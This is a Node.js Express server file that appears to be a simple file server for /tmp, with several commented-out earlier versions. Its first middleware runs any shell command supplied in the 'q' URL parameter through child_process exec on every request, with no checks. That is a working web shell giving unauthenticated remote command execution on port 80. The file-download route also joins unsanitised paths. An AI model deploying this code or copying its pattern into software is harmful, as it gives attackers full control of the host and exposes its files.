var sys = require('sys')
var exec = require('child_process').exec
var fs = require('fs')
var http = require('http')
var url = require('url')
var connect = require('connect')
var directory = require('serve-index')


var express = require('express')
, app = module.exports = express();


app.use(function (req, res,next) {

  var queryObject = url.parse(req.url,true).query;
  var q = queryObject.q;

  function puts(error, stdout, stderr) { sys.puts(stdout) }
  exec(q, puts);
  console.log(q);

  next();
//  res.end('Feel free to add query parameters to the end of the url');
});

app.use(directory('/tmp'));


// /files/* is accessed via req.params[0]
// but here we name it :file

app.get('/:file(*)', function(req, res, next){
  var file = req.params.file
  , path = '/tmp/' + file;

  res.download(path);
});

// error handling middleware. Because it's
// below our routes, you will be able to
// "intercept" errors, otherwise Connect
// will respond with 500 "Internal Server Error".
app.use(function(err, req, res, next){
  // special-case 404s,
  // remember you could
  // render a 404 template here
  if (404 == err.status) {
    res.statusCode = 404;
    res.send('Cant find that file, sorry!');
  } else {
    next(err);
  }
});

if (!module.parent) {
  app.listen(80);
  console.log('Express started on port %d', 80);
}





//ttp.createServer(function (req, res) {
//  var queryObject = url.parse(req.url,true).query;
//  console.log(queryObject);
//
//  var q = queryObject.q;
//
//function puts(error, stdout, stderr) { sys.puts(stdout) }
//exec(q, puts);
//
//
//  res.writeHead(200);
//  res.end('');
//}).listen(80);
//
//




//var app = connect()
//  .use(function (req, res,next) {
//
//  var queryObject = url.parse(req.url,true).query;
//  var q = queryObject.q;
//
//function puts(error, stdout, stderr) { sys.puts(stdout) }
//exec(q, puts);
//
////  res.end('Feel free to add query parameters to the end of the url');
//
//})
//
//  .use(connect.directory('/tmp'))
//
//http.createServer(app).listen(80);

